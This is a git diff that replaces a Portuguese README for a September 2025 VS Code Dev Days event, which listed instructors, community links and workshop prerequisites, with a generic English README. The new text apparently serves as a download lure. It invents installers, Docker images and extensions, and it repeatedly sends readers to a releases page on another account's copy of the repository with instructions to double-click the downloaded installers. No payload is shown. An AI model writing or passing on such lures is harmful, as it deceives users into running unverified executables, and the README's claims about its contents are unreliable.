@@ -1,54 +1,86 @@
-# vs-code-dev-days-2025-09-spcapital
- Conteúdos e atividades do VS Code Dev Days realizado no dia 27/09/2025. | VS Code, GitHub, Python, GitHub Codespaces, Docker, MCP, Docker MCP Hub...
+# 🎉 vs-code-dev-days-2025-09-spcapital - Explore Development Tools Easily
 
-Acesse este conteúdo via QRCode e também nos apoiem 🙌, deixando um star ⭐ no repositório do GitHub:
+## 🚀 Getting Started
 
-![QRCode Conteúdo](img/bit.ly_vs-code-dev-days-2025-09-spcapital.png)
+Welcome to the VS Code Dev Days event! This repository contains all the resources and activities from our event on September 27, 2025. Whether you're interested in using VS Code, GitHub, Python, GitHub Codespaces, Docker, or other tools, you’ll find everything you need here.
 
-Instrutores (links apontando para o LinkedIn, nos adicionem lá 😉):
-- Renato Groffe | [LinkedIn](https://www.linkedin.com/in/renatogroffe/) :: [GitHub](https://github.com/renatogroffe)
-- Vinicius Moura | [LinkedIn](https://www.linkedin.com/in/vinijmoura/) :: [GitHub](https://github.com/vinijmoura)
+## 🛠️ System Requirements
 
-Algumas de nossas comunidades técnicas (links para Meetup e YouTube):
-- [.NET São Paulo](https://www.meetup.com/dotnet-Sao-Paulo/)
-- [Azure Talks](https://www.meetup.com/azure-talks/)
-- [DevOps Professionals](https://www.meetup.com/DevOps-Professionals/)
-- [Canal .NET](https://www.youtube.com/canaldotnet)
-- [Azure na Prática](https://www.youtube.com/azurenapratica)
-- [Coding Night](https://www.youtube.com/codingnight)
-- [AzureBrasil Cloud](https://www.youtube.com/@azurebrasilcloud)
+To run the resources from this repository smoothly, please ensure your system meets the following requirements:
 
-Referências utilizadas:
-- [VS Code Dev Days - GitHub](https://github.com/microsoft/VS-Code-Dev-Days)
-- [Download do VS Code](https://aka.ms/vscode-dev-days/get-vscode)
-- [Obtenha o GitHub Copilot Free](https://aka.ms/vscode-dev-days/get-copilot)
-- [Extensions for VS Code](https://marketplace.visualstudio.com/vscode)
-- [Model Context Protocol](https://marketplace.visualstudio.com/vscode)
-- [Docker MCP Hub](https://hub.docker.com/mcp)
-- [APIsec University - Certificações online gratuitas](https://www.apisecuniversity.com/)
-- [Certificação Gratuita - Securing ‍LLM & NLP APIs - APIsec University](https://www.apisecuniversity.com/courses/securing-llm-nlp-apis)
-- [Certificação Gratuita - Building ‍Security into AI - APIsec University](https://www.apisecuniversity.com/courses/building-security-into-ai)
-- [Microsoft Learn MCP Server overview](https://learn.microsoft.com/en-us/training/support/mcp)
+- **Operating System:** Windows 10, macOS Catalina, or any Linux distribution with support for Docker.
+- **Processor:** Intel i3 or equivalent AMD processor.
+- **RAM:** Minimum 4 GB (8 GB recommended).
+- **Storage:** At least 500 MB free space for files and tools.
 
----
+## 📥 Download & Install
 
-## Atividades previstas
+You can easily access our software by visiting the releases page. Follow the link below to download the materials.
 
-| #  | Tópico                                              | Duração      | Descrição                                                                 | Recursos                |
-|----|----------------------------------------------------|--------------|-----------------------------------------------------------------------------|---|
-| 01 | Workshop                                          | 60 minutes   | Develop skills with VS Code and GitHub Copilot.                             | [**Instruções**](https://github.com/DotNetSP/integrate-mcp-with-copilot) |
+[Visit the Releases Page to Download](https://github.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/releases)
 
+After visiting the releases page, look for the latest version. Each release may contain different files, including installation packages and documentation. Select the files that suit your needs and follow these steps to install:
 
-### 0. Pré-requisitos
+1. **Click on the release version** you want to download.
+2. **Locate the assets section.** Here, you’ll see files available for download.
+3. **Choose the files** relevant to your interest. Common files include:
+   - VS Code extensions
+   - Docker images
+   - Sample Python projects
+4. **Download the selected files** by clicking on each one. They will save to your computer.
+5. **If you downloaded an installer**, double-click on the file to start the installation. Follow the on-screen instructions to complete the setup.
 
-Caso ainda não tenha uma conta no GitHub, comece instalando um aplicativo de One-Time Password (OTP) em seu celular. Recomendamos o Microsoft Authenticator, com versões para Android e iOS: https://www.microsoft.com/pt-br/security/mobile-authenticator-app
+## 📂 Resources Available
 
-Em seguida crie sua conta no GitHub usando um e-mail e nome válidos, com o link a seguir trazendo algumas instruções úteis e lembrando da necessidade se habilitar o MFA (autenticação multifator): https://docs.github.com/pt/get-started/start-your-journey/creating-an-account-on-github
+In this repository, you’ll find various resources to help enhance your development experience:
 
-Caso utilize uma máquina do laboratório, procure preferencialmente trabalhar com o GitHub logado em uma aba anônima!
+- **VS Code Extensions:** Enhance your programming environment with powerful tools.
+- **Docker Images:** Pre-configured containers to streamline your application deployment.
+- **Sample Python Projects:** Examples to help you learn and experiment with Python programming.
+- **Documentation:** Guides and tutorials to assist you while using the tools.
 
-### Para seguir aprendendo
+Each resource is designed to be user-friendly, ensuring that even those with little or no programming experience can get started.
 
-|              Laboratório              |                       Tópicos ensinados                     |                     Objetivo de Aprendizagem                |
-| :------------------------------------: | :---------------------------------------------------------: | ----------------------------------------------------------- |
-| [Hands-on com o GitHub Copilot: Criando Planos de Estudo com IA utilizando Modelos do GitHub](https://github.com/microsoft/lab-study-app/tree/main/tutorial/translations/pt-br) | Use o GitHub Copilot e o GitHub Models para gerar planos de estudo personalizados em uma aplicação web baseada em Flask. | Crie e personalize uma ferramenta de planejamento de estudos com IA usando o GitHub Copilot e o GitHub Models. Configure uma aplicação Flask, desenvolva prompts eficazes para criar trilhas de aprendizado personalizadas e incorpore testes de acessibilidade utilizando modos de chat personalizados. |
+## ❓ FAQs
+
+### What is VS Code?
+
+Visual Studio Code (VS Code) is a powerful code editor developed by Microsoft. It supports various programming languages and features like debugging, version control, and more.
+
+### How can I use Docker?
+
+Docker lets you run applications in isolated environments. By using Docker images, you can easily set up and manage projects without worrying about system dependencies.
+
+### Can I contribute to this repository?
+
+Absolutely! We welcome contributions. You can report issues, suggest new features, or even submit enhancements through pull requests. Follow the contribution guidelines in the repository for details.
+
+## 📚 Additional Learning
+
+Both novice and experienced users can benefit from learning more. Here are some recommended resources:
+
+- **[VS Code Documentation](https://code.visualstudio.com/docs)**
+- **[Docker Documentation](https://docs.docker.com/get-started/)**
+- **[Python Official Website](https://www.python.org/)**
+- **[GitHub Guides](https://guides.github.com/)**
+  
+Explore these links to boost your understanding of the tools and technologies discussed in this repository.
+
+## ⚙️ Troubleshooting
+
+If you encounter issues while downloading or installing, consider the following steps:
+
+1. **Check your internet connection.** Ensure it is stable.
+2. **Make sure you have enough storage space** on your device.
+3. **Verify that you are downloading the correct version** compatible with your operating system.
+4. **Consult the documentation** included with your downloads for specific guidance.
+
+If problems persist, feel free to open an issue in this repository. Our community is here to help!
+
+## 🔗 Important Links
+
+For quick access, remember to bookmark our releases page:
+
+[Visit the Releases Page to Download](https://github.com/AbdellahHaidrar/vs-code-dev-days-2025-09-spcapital/releases)
+
+Explore, learn, and enjoy your journey with these development tools. Your next big project is just a download away!
